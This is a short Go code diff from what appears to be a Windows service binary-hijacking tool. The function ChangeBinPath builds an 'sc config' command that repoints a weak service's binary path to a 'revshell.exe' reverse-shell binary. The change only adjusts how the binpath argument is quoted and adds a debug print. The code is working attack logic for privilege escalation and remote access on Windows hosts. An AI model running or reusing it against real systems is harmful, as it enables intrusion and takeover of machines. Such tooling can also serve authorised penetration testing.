@@ -18,7 +18,9 @@ func ChangeBinPath(serv *WeakServ, choice int) *WeakServ {
 	malPath := fmt.Sprintf(homeDir + `\win-binary-hijacking\internal\malbinaries\revshell.exe`)
 
 	// Formatting sc config portion here
-	cmdFormat := fmt.Sprintf("binpath=%q", malPath)
+	cmdFormat := fmt.Sprintf(`binpath="%s"`, malPath)
+
+	fmt.Println(cmdFormat)
 
 	cmd := exec.Command("sc", "config", serv.Name, cmdFormat)
 
